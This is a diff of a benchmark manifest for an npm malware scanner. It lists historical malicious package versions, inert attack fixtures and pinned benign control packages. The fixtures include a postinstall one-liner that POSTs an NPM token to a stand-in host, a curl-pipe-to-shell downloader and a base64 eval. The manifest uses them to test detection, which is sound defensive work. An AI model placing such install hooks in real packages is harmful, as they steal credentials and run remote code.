@@ -1,114 +1,195 @@
 {
   "$schema": "No formal schema — this file is consumed by benchmark/run.mjs",
-  "safetyPolicy": "Nothing in this manifest is malware and nothing here downloads malware. Part A pins historical malicious VERSIONS in lockfiles (text only — vexes flags them from OSV advisories, no package is fetched). Part B fixtures are techniques re-authored by us as inert source strings analyzed in-process. Part C downloads only well-known benign packages. No package code is ever executed in any part.",
+  "safetyPolicy": "Nothing in this manifest is malware and nothing here downloads malware. Part A puts historical package-version coordinates associated with OSV malware advisories into lockfiles as text; it does not fetch those packages. Part B uses repository-authored inert technique strings analyzed in-process. Part C downloads pinned, currently low-risk controls. No package code is ever executed in any part.",
+  "benignPolicy": {
+    "maxHighCriticalFalsePositives": 1,
+    "advisorySnapshotDate": "2026-08-28",
+    "definition": "A pinned live control is a heuristic false positive when the bounded deep sample emits any HIGH or CRITICAL non-advisory signal. These packages are not asserted permanently benign: current HIGH/CRITICAL advisory evidence is recorded separately and fails the control gate. Source coverage remains explicitly sampled and incomplete."
+  },
   "knownBad": [
     {
       "name": "event-stream",
       "version": "3.3.6",
-      "incident": "2018-11",
-      "advisory": "GHSA-mh6f-8j2x-4483",
-      "summary": "Backdoored release exfiltrated Bitcoin wallet secrets via an obfuscated dependency chain"
+      "advisory": "GHSA-mh6f-8j2x-4483"
     },
     {
       "name": "ua-parser-js",
       "version": "0.7.29",
-      "incident": "2021-10",
-      "advisory": "GHSA-pjwm-rvh2-c87w",
-      "summary": "Hijacked release dropped a credential stealer and cryptominer"
+      "advisory": "GHSA-pjwm-rvh2-c87w"
     },
     {
       "name": "coa",
       "version": "2.0.3",
-      "incident": "2021-11",
-      "advisory": "GHSA-73qr-pfmq-6rp8",
-      "summary": "Hijacked release exfiltrated credentials from install scripts"
+      "advisory": "GHSA-73qr-pfmq-6rp8"
     },
     {
       "name": "node-ipc",
       "version": "11.3.0",
-      "incident": "2022-03",
-      "advisory": "GHSA-3mpp-xfvh-qh37",
-      "summary": "ProTest: pulled in peacenotwar, which overwrote files on affected systems"
+      "advisory": "GHSA-3mpp-xfvh-qh37"
     },
     {
       "name": "crossenv",
       "version": "0.0.8",
-      "incident": "2017-08",
-      "advisory": "GHSA-c2m4-w5hm-vqjw",
-      "summary": "Typosquat of cross-env; postinstall exfiltrated environment variables"
+      "advisory": "GHSA-c2m4-w5hm-vqjw"
     }
   ],
   "techniques": [
     {
       "id": "env-exfil-postinstall",
+      "kind": "attack",
       "technique": "postinstall reads environment variables and POSTs them to a remote host",
       "name": "totally-normal-utils",
       "scripts": {
-        "postinstall": "node -e \"const h=require('https');const p=JSON.stringify(process.env);h.request({hostname:'collector.example.invalid',path:'/e',method:'POST'},()=>{}).end(p)\""
+        "postinstall": "node -e \"const h=require('https');const p=JSON.stringify({token:process.env.NPM_TOKEN});h.request({hostname:'collector.example.invalid',path:'/e',method:'POST'},()=>{}).end(p)\""
       },
       "previousInstallScripts": null,
-      "expectAnyOf": ["POSTINSTALL_SCRIPT", "AST_DANGEROUS_PATTERN", "INITIAL_DANGEROUS_CAPABILITY"]
+      "expectAll": [
+        { "signal": "AST_DANGEROUS_PATTERN", "evidence": { "pattern": "ENV_HARVESTING" } },
+        { "signal": "AST_DANGEROUS_PATTERN", "evidence": { "pattern": "NETWORK_ACCESS" } }
+      ]
     },
     {
       "id": "downloader-postinstall",
+      "kind": "attack",
       "technique": "postinstall downloads and runs a remote script via child_process",
       "name": "fast-build-helper",
       "scripts": {
         "postinstall": "node -e \"require('child_process').exec('curl -s http://cdn.example.invalid/i.sh | sh')\""
       },
       "previousInstallScripts": null,
-      "expectAnyOf": ["POSTINSTALL_SCRIPT", "AST_DANGEROUS_PATTERN", "INITIAL_DANGEROUS_CAPABILITY"]
+      "expectAll": [
+        { "signal": "AST_DANGEROUS_PATTERN", "evidence": { "pattern": "PROCESS_SPAWN" } }
+      ]
     },
     {
       "id": "obfuscated-payload",
+      "kind": "attack",
       "technique": "base64-decoded payload handed to eval at install time",
       "name": "skinny-license",
       "scripts": {
         "postinstall": "node -e \"eval(Buffer.from('aGVsbG8gZnJvbSB0aGUgcGF5bG9hZA==','base64').toString())\""
       },
       "previousInstallScripts": null,
-      "expectAnyOf": ["POSTINSTALL_SCRIPT", "AST_DANGEROUS_PATTERN", "INITIAL_DANGEROUS_CAPABILITY"]
+      "expectAll": [
+        { "signal": "AST_DANGEROUS_PATTERN", "evidence": { "pattern": "CODE_EXECUTION" } },
+        { "signal": "AST_DANGEROUS_PATTERN", "evidence": { "pattern": "BASE64_DECODE" } }
+      ]
     },
     {
       "id": "capability-escalation",
+      "kind": "attack",
       "technique": "clean previous version, first-ever network-capable install script in the new one",
       "name": "quiet-widget",
       "scripts": {
         "postinstall": "node -e \"require('https').get('https://metrics.example.invalid/ping')\""
       },
       "previousInstallScripts": {},
-      "expectAnyOf": ["CAPABILITY_ESCALATION"]
+      "expectAll": [
+        { "signal": "CAPABILITY_ESCALATION", "evidence": { "capability": "network" } },
+        { "signal": "AST_DANGEROUS_PATTERN", "evidence": { "pattern": "NETWORK_ACCESS" } }
+      ]
     },
     {
       "id": "typosquat-name",
+      "kind": "attack",
       "technique": "package name one edit-distance from a popular package",
       "name": "expres",
       "scripts": {},
       "previousInstallScripts": null,
-      "expectAnyOf": ["TYPOSQUAT"]
+      "expectAll": [
+        { "signal": "TYPOSQUAT" }
+      ]
     },
     {
       "id": "clean-build-script",
+      "kind": "control",
       "technique": "false-positive check: benign inline build verification",
       "name": "honest-widget",
       "scripts": {
         "postinstall": "node -e \"require('./lib/verify.js').check()\""
       },
       "previousInstallScripts": {},
-      "expectAnyOf": [],
-      "expectNone": ["AST_DANGEROUS_PATTERN"]
+      "expectAll": [],
+      "expectNone": [
+        { "signal": "AST_DANGEROUS_PATTERN" },
+        { "signal": "CAPABILITY_ESCALATION" }
+      ]
+    },
+    {
+      "id": "clean-no-hook-package",
+      "kind": "control",
+      "technique": "false-positive check: ordinary package metadata with no install hooks",
+      "name": "honest-control-xyz",
+      "scripts": {},
+      "previousInstallScripts": {},
+      "expectAll": [],
+      "expectNone": [
+        { "signal": "AST_DANGEROUS_PATTERN" },
+        { "signal": "TYPOSQUAT" },
+        { "signal": "HOMOGLYPH" }
+      ]
     }
   ],
   "benignLive": [
-    { "name": "lodash", "note": "no lifecycle scripts" },
-    { "name": "express", "note": "no lifecycle scripts" },
-    { "name": "chalk", "note": "no lifecycle scripts" },
-    { "name": "ms", "note": "tiny utility" },
-    { "name": "debug", "note": "tiny utility" },
-    { "name": "semver", "note": "no lifecycle scripts" },
-    { "name": "typescript", "note": "large but script-free" },
-    { "name": "esbuild", "note": "HAS postinstall — deliberate FP stressor (platform binary bootstrap)" },
-    { "name": "react", "note": "no lifecycle scripts" },
-    { "name": "axios", "note": "no lifecycle scripts" }
+    {
+      "name": "picocolors", "version": "1.1.1", "note": "small no-hook utility; low-risk snapshot, not a permanent safety claim",
+      "tarball": "https://registry.npmjs.org/picocolors/-/picocolors-1.1.1.tgz",
+      "integrity": "sha512-xceH2snhtb5M9liqDsmEw56le376mTZkEX/jEb/RxNFyegNul7eNslCXP9FDj/Lcu0X8KEyMceP2ntpaHrDEVA==",
+      "shasum": "3d321af3eab939b083c8f929a1d12cda81c26b6b"
+    },
+    {
+      "name": "express", "version": "4.21.2", "note": "no lifecycle scripts",
+      "tarball": "https://registry.npmjs.org/express/-/express-4.21.2.tgz",
+      "integrity": "sha512-28HqgMZAmih1Czt9ny7qr6ek2qddF4FclbMzwhCREB6OFfH+rXAnuNCwo1/wFvrtbgsQDb4kSbX9de9lFbrXnA==",
+      "shasum": "cf250e48362174ead6cea4a566abef0162c1ec32"
+    },
+    {
+      "name": "chalk", "version": "5.4.1", "note": "no lifecycle scripts",
+      "tarball": "https://registry.npmjs.org/chalk/-/chalk-5.4.1.tgz",
+      "integrity": "sha512-zgVZuo2WcZgfUEmsn6eO3kINexW8RAE4maiQ8QNs8CtpPCSyMiYsULR3HQYkm3w8FIA3SberyMJMSldGsW+U3w==",
+      "shasum": "1b48bf0963ec158dce2aacf69c093ae2dd2092d8"
+    },
+    {
+      "name": "ms", "version": "2.1.3", "note": "tiny utility",
+      "tarball": "https://registry.npmjs.org/ms/-/ms-2.1.3.tgz",
+      "integrity": "sha512-6FlzubTLZG3J2a/NVCAleEhjzq5oxgHyaCU9yYXvcLsvoVaHJq/s5xXI6/XXP6tz7R9xAOtHnSO/tXtF3WRTlA==",
+      "shasum": "574c8138ce1d2b5861f0b44579dbadd60c6615b2"
+    },
+    {
+      "name": "debug", "version": "4.4.1", "note": "tiny utility",
+      "tarball": "https://registry.npmjs.org/debug/-/debug-4.4.1.tgz",
+      "integrity": "sha512-KcKCqiftBJcZr++7ykoDIEwSa3XWowTfNPo92BYxjXiyYEVrUQh2aLyhxBCwww+heortUFxEJYcRzosstTEBYQ==",
+      "shasum": "e5a8bc6cbc4c6cd3e64308b0693a3d4fa550189b"
+    },
+    {
+      "name": "semver", "version": "7.7.2", "note": "no lifecycle scripts",
+      "tarball": "https://registry.npmjs.org/semver/-/semver-7.7.2.tgz",
+      "integrity": "sha512-RF0Fw+rO5AMf9MAyaRXI4AV0Ulj5lMHqVxxdSgiVbixSCXoEmmX/jk0CuJw4+3SqroYO9VoUh+HcuJivvtJemA==",
+      "shasum": "67d99fdcd35cec21e6f8b87a7fd515a33f982b58"
+    },
+    {
+      "name": "commander", "version": "15.0.0", "note": "popular CLI parser; low-risk snapshot with bounded packument",
+      "tarball": "https://registry.npmjs.org/commander/-/commander-15.0.0.tgz",
+      "integrity": "sha512-z67u4ZhzCL/Tydu1lJARtEZYWbWaN7oYLHbsuzocr6y4N6WZAagG3RQ4FW61V1/0+jImpj293XfrcYnd1qxtPg==",
+      "shasum": "96f3961f12adac1799ef3fbd8bc61d40572d1b11"
+    },
+    {
+      "name": "esbuild", "version": "0.25.9", "note": "postinstall binary bootstrap stressor",
+      "tarball": "https://registry.npmjs.org/esbuild/-/esbuild-0.25.9.tgz",
+      "integrity": "sha512-CRbODhYyQx3qp7ZEwzxOk4JBqmD/seJrzPa/cGjY1VtIn5E09Oi9/dB4JwctnfZ8Q8iT7rioVv5k/FNT/uf54g==",
+      "shasum": "15ab8e39ae6cdc64c24ff8a2c0aef5b3fd9fa976"
+    },
+    {
+      "name": "react", "version": "19.1.1", "note": "no lifecycle scripts",
+      "tarball": "https://registry.npmjs.org/react/-/react-19.1.1.tgz",
+      "integrity": "sha512-w8nqGImo45dmMIfljjMwOGtbmC/mk4CMYhWIicdSflH91J9TyCyczcPFXJzrZ/ZXcgGRFeP6BU0BEJTw6tZdfQ==",
+      "shasum": "06d9149ec5e083a67f9a1e39ce97b06a03b644af"
+    },
+    {
+      "name": "zod", "version": "4.5.2", "note": "provenance-bearing library; low-risk snapshot, not a permanent safety claim",
+      "tarball": "https://registry.npmjs.org/zod/-/zod-4.5.2.tgz",
+      "integrity": "sha512-XkYXCol10+ba/6F/cueWV+TezUeOqXW0hdeJt5CdXjTYeAgAQg5N03RQdJ80mhfFE72+pblvYMW4wy2Qp4Qbrg==",
+      "shasum": "b580586f06ac3758aea39b2c2a319f90987aa477"
+    }
   ]
 }
